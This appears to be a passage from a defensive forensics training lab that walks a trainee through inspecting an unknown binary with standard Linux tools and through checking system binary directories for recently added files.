cd /home/trainee/lab
﻿

2. Run the following commands and review their output to determine the identity and behavior of the file named unknown. The next question refers to this step.

(trainee@kali-hunt)-[~/lab] file unknown
﻿

(trainee@kali-hunt)-[~/lab] stat unknown
﻿

(trainee@kali-hunt)-[~/lab] strings unknown
﻿

(trainee@kali-hunt)-[~/lab] readelf -a unknown
﻿

(trainee@kali-hunt)-[~/lab] ldd unknown
﻿

(trainee@kali-hunt)-[~/lab] hexdump -n 100 --canonical unknown

-------------------------------------------------------------------

Linux Directory Analysis
Utilize directory analysis to determine which binary was most recently added to the file system. This analysis may be performed across all files and subfolders in a directory to determine what has recently changed or whether applications and users are abusing misconfigurations to access those directories.

﻿

Conduct Directory Analysis
﻿

Much of directory analysis involves comparing known standard layouts and included or expected files to a modified file system state. If a device is compromised, attackers may hide artifacts in locations that are unlikely to be viewed frequently or where they are lost in the noise of other similar files. Additionally, placing malicious software in one of the protected directories in the system path allows for the file to be executed from anywhere in the system.

﻿

Workflow
﻿

1. In a terminal window in the VM kali-hunt, analyze the following directories and examine the creation times of the files to determine which binaries were most recently added to the protected binary directories. The next question refers to this step.

﻿

/bin
﻿

/sbin
﻿

/usr/bin
﻿

/usr/sbin
﻿












